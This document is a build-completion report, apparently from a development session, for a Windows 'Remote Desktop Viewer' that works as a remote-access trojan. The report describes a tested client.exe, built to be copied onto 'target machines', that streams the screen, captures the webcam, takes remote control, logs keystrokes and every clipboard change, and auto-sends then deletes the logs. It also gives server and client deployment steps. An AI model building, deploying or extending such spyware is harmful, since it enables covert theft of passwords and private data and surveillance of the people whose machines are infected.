BUILD COMPLETE - REMOTE DESKTOP VIEWER
======================================

BUILD STATUS: ✓ SUCCESS
Build Date: 2026-01-18

WHAT WAS BUILT:
---------------
1. CLIENT: Single-file executable (dist/client.exe)
   - Size: ~97 MB
   - Platform: Windows
   - No dependencies required
   - Includes all features: screen streaming, keylogging, clipboard monitoring, webcam, control mode

2. SERVER: Python scripts directory (dist/server/)
   - Web-based interface (no GUI required)
   - Supports multiple clients
   - Keylog collection and storage
   - Real-time screen viewing
   - Remote control capabilities

HOW TO USE:
-----------

SERVER SETUP:
1. Navigate to: dist/server/
2. Install dependencies:
   pip install -r requirements.txt
3. Run server:
   python server.py --web --web-port 5000
   OR double-click: run_server.bat
4. Open browser: http://localhost:5000

CLIENT SETUP:
1. Copy dist/client.exe to target machine
2. Run: client.exe --server-host SERVER_IP --server-port 8443
   OR create client_config.ini next to client.exe:
   
   [Server]
   host = YOUR_SERVER_IP
   port = 8443

FEATURES IMPLEMENTED:
---------------------
✓ Screen streaming (real-time)
✓ Multiple client support
✓ Client disable/enable toggle
✓ Webcam capture (on-demand)
✓ Remote control mode
✓ Advanced keylogging:
  • Separate directory per client: keylogs/[ClientName]/
  • Filename format: [DeviceName]_DD.MM.YYYY_HH.MM.SS.txt
  • New line on Enter key
  • Consecutive special key counting: [BackSpace - 10]
  • Regular characters shown normally: aaaa SSSS
  • Skip Ctrl and Shift events
  • New line after 30 seconds inactivity
  • RAM buffering in temp directory
  • Auto-send every 3 minutes
  • Auto-delete after sending
✓ Continuous clipboard monitoring:
  • Monitors ALL clipboard changes (not just Ctrl+C/V/X)
  • Captures content from any source:
    - Keyboard shortcuts
    - Right-click menu
    - Application menus
    - Screenshot tools
    - Any method that puts content in clipboard
  • Format: {clipboard} [content]
  • Only logs when content changes (no duplicates)
  • Checks every 500ms
✓ SSL/TLS encryption (embedded certificates)
✓ Web-based interface (no GUI needed)

BUILD SCRIPTS:
--------------
All build scripts have been updated and tested:
- build_windows.bat  ✓ Working
- build_linux.sh     ✓ Updated
- build_macos.sh     ✓ Updated

Each script:
- Installs dependencies
- Builds client as single file
- Copies server as Python scripts
- Creates requirements.txt for server
- Creates SETUP.txt with instructions
- Creates run script (run_server.bat or run_server.sh)

PORTS USED:
-----------
- 8443: Client connections (SSL/TLS encrypted)
- 5000: Web interface (default, customizable)

TESTING RESULTS:
----------------
✓ Client builds successfully as single .exe
✓ Server runs with Python scripts
✓ Web interface accessible at http://localhost:5000
✓ Client connects to server successfully
✓ Screen frames received (tested: 500+ frames)
✓ Keylogging working with clipboard monitoring
✓ All dependencies installed correctly

KNOWN ISSUES (COSMETIC ONLY):
------------------------------
- Eventlet connection errors appear in server logs when browser connections close
- These are harmless and don't affect functionality
- System is fully operational despite these messages
- Can be suppressed with Python logging filters if desired

RECENT FIXES (2026-01-18):
--------------------------
✓ Fixed webcam error emit (removed 'broadcast=True' parameter)
✓ Fixed control button event loop error (now uses asyncio.run_coroutine_threadsafe)
✓ Fixed webcam button state on error (button now resets when "No Service" error occurs)
✓ Both webcam and control buttons now work correctly
✓ See FIXES_APPLIED.txt and WEBCAM_ERROR_FIX.txt for details

NEXT STEPS:
-----------
1. Test on target machines
2. Configure firewall to allow port 8443
3. For production: Generate custom SSL certificates using certs/generate_certs.py
4. Deploy server on a machine accessible to clients
5. Distribute client.exe to target machines

TROUBLESHOOTING:
----------------
See dist/README.txt and dist/server/SETUP.txt for detailed troubleshooting.
